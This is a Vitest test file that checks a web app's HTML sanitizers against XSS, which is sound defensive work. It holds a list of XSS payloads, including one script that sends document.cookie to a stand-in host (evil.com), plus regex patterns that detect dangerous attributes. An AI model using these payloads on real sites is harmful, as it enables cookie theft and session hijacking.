import { describe, it, expect } from 'vitest';
import { sanitizeHTML, escapeHTML, sanitizeConsentForm, stripHTML } from '../../utils/sanitize';

/**
 * Tests for HTML Sanitization Utilities
 * Verifies XSS prevention in the application
 */

describe('Sanitize Utilities', () => {
  describe('sanitizeHTML', () => {
    it('should return empty string for null/undefined', () => {
      expect(sanitizeHTML(null)).toBe('');
      expect(sanitizeHTML(undefined)).toBe('');
      expect(sanitizeHTML('')).toBe('');
    });

    it('should allow safe HTML tags', () => {
      const input = '<p>Hello <strong>World</strong></p>';
      const result = sanitizeHTML(input);
      expect(result).toContain('<p>');
      expect(result).toContain('<strong>');
    });

    it('should remove script tags', () => {
      const input = '<p>Safe</p><script>alert("XSS")</script>';
      const result = sanitizeHTML(input);
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('alert');
      expect(result).toContain('Safe');
    });

    it('should remove onclick handlers', () => {
      const input = '<button onclick="alert(\'XSS\')">Click</button>';
      const result = sanitizeHTML(input);
      expect(result).not.toContain('onclick');
      expect(result).not.toContain('alert');
    });

    it('should remove onerror handlers', () => {
      const input = '<img src="x" onerror="alert(\'XSS\')">';
      const result = sanitizeHTML(input);
      expect(result).not.toContain('onerror');
    });

    it('should remove javascript: URLs', () => {
      const input = '<a href="javascript:alert(\'XSS\')">Click</a>';
      const result = sanitizeHTML(input);
      expect(result).not.toContain('javascript:');
    });

    it('should remove iframe tags', () => {
      const input = '<iframe src="https://evil.com"></iframe>';
      const result = sanitizeHTML(input);
      expect(result).not.toContain('<iframe');
    });

    it('should remove form elements', () => {
      const input = '<form action="/steal"><input type="text"><button>Submit</button></form>';
      const result = sanitizeHTML(input);
      expect(result).not.toContain('<form');
      expect(result).not.toContain('<input');
      expect(result).not.toContain('<button');
    });

    it('should preserve safe links', () => {
      const input = '<a href="https://example.com">Link</a>';
      const result = sanitizeHTML(input);
      expect(result).toContain('href="https://example.com"');
    });

    it('should preserve images with safe sources', () => {
      const input = '<img src="https://example.com/img.jpg" alt="Test">';
      const result = sanitizeHTML(input);
      expect(result).toContain('src="https://example.com/img.jpg"');
    });

    it('should preserve tables', () => {
      const input = '<table><tr><td>Cell</td></tr></table>';
      const result = sanitizeHTML(input);
      expect(result).toContain('<table>');
      expect(result).toContain('<td>');
    });

    it('should handle complex XSS payloads', () => {
      const payloads = [
        '<svg onload="alert(1)">',
        '<body onload="alert(1)">',
        '<img src=x onerror=alert(1)>',
        '<div onclick="alert(1)">',
        '"><script>alert(1)</script>',
        '\';alert(1);//',
        '<style>@import "javascript:alert(1)"</style>',
      ];

      payloads.forEach(payload => {
        const result = sanitizeHTML(payload);
        expect(result).not.toMatch(/onload|onerror|onclick|<script|javascript:/i);
      });
    });
  });

  describe('escapeHTML', () => {
    it('should return empty string for null/undefined', () => {
      expect(escapeHTML(null)).toBe('');
      expect(escapeHTML(undefined)).toBe('');
      expect(escapeHTML('')).toBe('');
    });

    it('should escape < and >', () => {
      expect(escapeHTML('<script>')).toBe('&lt;script&gt;');
    });

    it('should escape &', () => {
      expect(escapeHTML('Tom & Jerry')).toBe('Tom &amp; Jerry');
    });

    it('should escape quotes', () => {
      expect(escapeHTML('"quoted"')).toBe('&quot;quoted&quot;');
      expect(escapeHTML("'single'")).toBe('&#x27;single&#x27;');
    });

    it('should escape forward slash', () => {
      expect(escapeHTML('a/b')).toBe('a&#x2F;b');
    });

    it('should handle complex strings', () => {
      const input = '<script>alert("XSS")</script>';
      const result = escapeHTML(input);
      expect(result).not.toContain('<');
      expect(result).not.toContain('>');
      expect(result).toContain('&lt;');
      expect(result).toContain('&gt;');
    });

    it('should convert numbers to strings', () => {
      expect(escapeHTML(123)).toBe('123');
    });
  });

  describe('sanitizeConsentForm', () => {
    it('should return empty string for null/undefined', () => {
      expect(sanitizeConsentForm(null)).toBe('');
      expect(sanitizeConsentForm(undefined)).toBe('');
    });

    it('should allow basic formatting', () => {
      const input = '<h1>Title</h1><p>Content with <strong>bold</strong> and <em>italic</em></p>';
      const result = sanitizeConsentForm(input);
      expect(result).toContain('<h1>');
      expect(result).toContain('<p>');
      expect(result).toContain('<strong>');
      expect(result).toContain('<em>');
    });

    it('should allow lists', () => {
      const input = '<ul><li>Item 1</li><li>Item 2</li></ul>';
      const result = sanitizeConsentForm(input);
      expect(result).toContain('<ul>');
      expect(result).toContain('<li>');
    });

    it('should allow tables', () => {
      const input = '<table><tr><th>Header</th></tr><tr><td>Data</td></tr></table>';
      const result = sanitizeConsentForm(input);
      expect(result).toContain('<table>');
      expect(result).toContain('<th>');
      expect(result).toContain('<td>');
    });

    it('should remove links (stricter than sanitizeHTML)', () => {
      const input = '<p>Click <a href="https://example.com">here</a></p>';
      const result = sanitizeConsentForm(input);
      expect(result).not.toContain('<a');
      expect(result).not.toContain('href');
    });

    it('should remove images (stricter than sanitizeHTML)', () => {
      const input = '<p>See <img src="image.jpg" alt="test"></p>';
      const result = sanitizeConsentForm(input);
      expect(result).not.toContain('<img');
      expect(result).not.toContain('src=');
    });

    it('should remove all scripts and event handlers', () => {
      const input = '<p onclick="alert(1)">Click</p><script>alert(2)</script>';
      const result = sanitizeConsentForm(input);
      expect(result).not.toContain('onclick');
      expect(result).not.toContain('<script');
      expect(result).toContain('Click');
    });
  });

  describe('stripHTML', () => {
    it('should return empty string for null/undefined', () => {
      expect(stripHTML(null)).toBe('');
      expect(stripHTML(undefined)).toBe('');
    });

    it('should remove all HTML tags', () => {
      const input = '<h1>Title</h1><p>Paragraph with <strong>bold</strong></p>';
      const result = stripHTML(input);
      expect(result).not.toContain('<');
      expect(result).not.toContain('>');
      expect(result).toContain('Title');
      expect(result).toContain('Paragraph');
      expect(result).toContain('bold');
    });

    it('should return plain text', () => {
      const input = '<div><p>Hello World</p></div>';
      const result = stripHTML(input);
      expect(result).toBe('Hello World');
    });

    it('should handle script tags', () => {
      const input = 'Text<script>alert(1)</script>More';
      const result = stripHTML(input);
      expect(result).not.toContain('script');
      expect(result).not.toContain('alert');
    });
  });

  describe('Real-world XSS attack vectors', () => {
    const attackVectors = [
      { name: 'Basic script', payload: '<script>document.location="http://evil.com/?c="+document.cookie</script>' },
      { name: 'IMG onerror', payload: '<img src=x onerror=alert(document.cookie)>' },
      { name: 'SVG onload', payload: '<svg/onload=alert(1)>' },
      { name: 'Body onload', payload: '<body onload=alert(1)>' },
      { name: 'Input autofocus', payload: '<input autofocus onfocus=alert(1)>' },
      { name: 'Marquee', payload: '<marquee onstart=alert(1)>' },
      { name: 'Video', payload: '<video><source onerror="alert(1)">' },
      { name: 'Math', payload: '<math><maction actiontype="statusline#http://evil.com">CLICKME</maction></math>' },
      { name: 'Table background', payload: '<table background="javascript:alert(1)">' },
      { name: 'DIV style', payload: '<div style="background:url(javascript:alert(1))">' },
      { name: 'Object data', payload: '<object data="javascript:alert(1)">' },
      { name: 'Embed src', payload: '<embed src="javascript:alert(1)">' },
      { name: 'Base href', payload: '<base href="javascript:alert(1)//">' },
      { name: 'Link href', payload: '<link rel="import" href="javascript:alert(1)">' },
      { name: 'Meta refresh', payload: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">' },
      { name: 'Form action', payload: '<form action="javascript:alert(1)"><input type="submit">' },
      { name: 'IsIndex prompt', payload: '<isindex type=image src=1 onerror=alert(1)>' },
      { name: 'Event handler variations', payload: '<div onmouseover="alert(1)" onmouseout="alert(2)" onclick="alert(3)">' },
      { name: 'Data URI', payload: '<a href="data:text/html,<script>alert(1)</script>">click</a>' },
      { name: 'VBScript', payload: '<a href="vbscript:msgbox(1)">click</a>' },
    ];

    attackVectors.forEach(({ name, payload }) => {
      it(`should neutralize: ${name}`, () => {
        const sanitized = sanitizeHTML(payload);
        // Should not contain dangerous patterns
        expect(sanitized).not.toMatch(/javascript:|vbscript:|data:text\/html/i);
        expect(sanitized).not.toMatch(/on\w+\s*=/i);
        expect(sanitized).not.toMatch(/<script/i);
        expect(sanitized).not.toMatch(/<embed/i);
        expect(sanitized).not.toMatch(/<object/i);
        expect(sanitized).not.toMatch(/<form/i);
      });
    });
  });
});
